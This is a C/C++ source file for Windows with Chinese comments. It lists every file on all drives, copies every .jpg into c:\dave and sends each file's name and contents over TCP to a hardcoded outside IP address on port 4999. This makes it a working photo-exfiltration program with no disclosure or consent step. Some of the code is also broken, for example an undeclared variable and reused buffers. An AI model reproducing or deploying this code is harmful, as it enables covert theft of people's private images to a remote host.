#include<stdio.h>
#include<stdlib.h>
#include <direct.h>
#include<string.h>
#include <WinSock2.h>
#include<Windows.h>
#include<string>
#pragma comment(lib,"Ws2_32")
#define  BUF_SZIE    256
int main(int argc,char **argv){
	char dirbuf[1024];
	char buf[BUF_SZIE];
	char loc[]="c:\\temp.dat";
	FILE *pf=fopen(loc,"a+");
	fseek(pf,0L,SEEK_END);
	fpos_t big_file_pos;  
        fgetpos(pf,&big_file_pos);//保存文件位置  
	fclose(pf);//调用dir重定向，写文件时，必须先关掉文件
	if(big_file_pos==0){
		sprintf(buf,"%s","dir /s/b/a ");
		char *p=buf+strlen("dir /s/b/a ");
		for( int drive = 1; drive <= 26; drive++ ){
			if( !_chdrive( drive ) ){
				sprintf( p,"%c: ", drive + 'A' - 1 );
				p+=3;
			}
		}
		sprintf(buf+strlen(buf),">%s",loc);
		system(buf);
	}
	pf=fopen(loc,"r");
	char path[]="mkdir c:\\dave";
	char key[]=".jpg";
	system(path);
	while(fgets(dirbuf,sizeof(dirbuf),pf)){
		dirbuf[strlen(dirbuf)-1]='\0';
		std::string line=dirbuf;
		if(line.find(key)!=line.npos){
			std::string cp="copy "+line+"\tc:\\dave";
			printf("%s\n",cp.c_str());
			system(cp.c_str());
		}
	}
	
	//返回数据
	SOCKET sHost;
	WSADATA wsd;
	if (WSAStartup(MAKEWORD(2,2), &wsd) != 0){
		printf("WSAStartup failed!\n");
		return -1;
	}
	sHost = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);   
	if(INVALID_SOCKET == sHost){
		WSACleanup();
		return  -1;
	}
	SOCKADDR_IN     servAddr;
	servAddr.sin_family =AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("219.245.81.65");
	servAddr.sin_port = htons((short)4999);
	int nServAddlen  = sizeof(servAddr);
	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));   
	if(SOCKET_ERROR == retVal){   
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	std::string file_dir_info="dir /s/b/a c:\\dave>c:\\dave\\temp.dat";
	pf=fopen("c:\\dave\\temp.dat","w");
	fclose(pf);
	system(file_dir_info.c_str());
	pf=fopen("c:\\dave\\temp.dat","r");
	ZeroMemory(buf, BUF_SZIE);
	while(fgets(buf,sizeof(buf),pf)){
		buf[strlen(buf)-1]='\0';
		std::string line=buf;
		int n=line.rfind('\\');
		std::string file_name(line.begin()+n+1,line.end());
		send(sHost, file_name.c_str(), file_name.length(), 0);
		Sleep(1000);
		FILE *src=fopen(buf,"rb");
		while(n=fread(buf+1,1,BUF_SZIE-1,src)){
			buf[0]=n;
			send(sHost, buf, n+1, 0);
		}
		fclose(src);
		Sleep(1000);
		send(sHost, "#!", 2, 0);
		ZeroMemory(buf, BUF_SZIE);
		Sleep(1000);//一定要sleep
	}
	Sleep(10000);
	printf("over");
	closesocket(sHost);
	WSACleanup();
	return 0;
}
